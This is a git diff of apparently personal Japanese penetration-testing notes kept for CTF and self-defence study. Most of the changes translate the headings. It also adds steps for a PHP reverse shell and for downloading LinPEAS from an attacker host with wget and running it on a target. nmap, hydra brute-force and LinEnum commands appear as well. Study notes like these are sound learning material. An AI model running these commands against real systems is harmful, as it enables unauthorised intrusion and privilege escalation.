@@ -21,7 +21,7 @@ endif::[]
 
 [CAUTION]
 ====
-KtokKawuは、自衛や検証/CTFのため、ハッキング技術を学習しています。
+KtokKawuは、自衛や検証/CTFのため、ハッキング技術を学習しています。 +
 自分の管理外の端末や機器(一般に公開されているWebサイトや各種サーバやWi-Fiスポット、他人の端末や機器等)に対し、 +
 非合法な目的で本リポジトリで公開しているツール類やテクニックを使用しないこと。 +
 必ず自己責任の元、ローカル環境やCTF等で攻撃が許可されたサイトに対してのみ使用すること。 +
@@ -140,14 +140,15 @@ docker inspect --format '{{ .NetworkSettings.IPAddress }}' <C-NAME>
 
 == ハッキング技術メモ
 
-=== port & oss version search(Example:SMB)
+=== ポートとOSSバージョンの確認
 
+.SMBの例
 ----
 https://medium.com/@arnavtripathy98/smb-enumeration-for-penetration-testing-e782a328bf1b
 nmap -sC -p 139,445 -sV 10.10.65.189
 ----
 
-=== CVE check
+=== CVEのチェック
 
 ----
 git clone https://github.com/scipag/vulscan scipag_vulscan
@@ -155,7 +156,7 @@ ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan
 nmap -sV -p 22,80,81,82,83,9999 --script=vulscan/vulscan.nse www.example.com 10.10.192.87
 ----
 
-=== Login Attack
+=== ログイン施行
 
 ★そのうち書く
 
@@ -283,13 +284,18 @@ gobuster -e -u http://A.B.C.D/ -w /usr/share/dirbuster/wordlists/directory-list-
 # -Vオプション：PWDマイニング中に2つのログイン+パスワードを表示
 # -fオプション：指定したPWDが見つかったら停止
 hydra -l [uname] -P ./pwd-list/[pwdtext] [IP] [Protocol] -V -f
-# https://ozuma.hatenablog.jp/entry/20130601/1370094859
 # 効率的には、およそssh(2/s) < ftp(6/s) < http-basic(100/s)の速さ
 ----
 
 === Penetration
 
-==== PHP
+==== PHPリバースシェル
+
+===== Scripts
+
+https://github.com/pentestmonkey/php-reverse-shell
+
+===== 手順
 
 ----
 vim php-reverse-shell.php # change "$ip" value to [MyHostIP]
@@ -307,7 +313,7 @@ john crack --show
 chmod 600 id_rsa
 ----
 
-=== Privilege Escalation
+=== 権限昇格
 
 ==== Scripts
 
@@ -318,17 +324,42 @@ chmod 600 id_rsa
 
 ==== 手順
 
-===== LinEnum
-
+* ターゲット側でスクリプトを実行する際は、 +
+使っているユーザ権限で自由にファイル授受できるディレクトリに移動するとよい。
++
+.権限の緩いディレクトリの例
 ----
-# Attacker machine
-wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-python -m SimpleHTTPServer 1234
-# Target machine
-cd /var/tmp
+/var/tmp
 /dev/shm
 /var/lock
 /run/lock
+----
+
+==== LinPEAS
+
+----
+# 攻撃者側
+cd /var/tmp
+wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+python -m SimpleHTTPServer 1234
+
+# ターゲット側 
+cd /var/tmp
+wget http://[MyHostIP]:1234/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+----
+
+===== LinEnum
+
+----
+# 攻撃者側
+cd /var/tmp
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+python -m SimpleHTTPServer 1234
+
+# ターゲット側
+cd /var/tmp
 which wget
 wget [MyHostIP]:1234/LinEnum.sh
 chmod +x LinEnum.sh
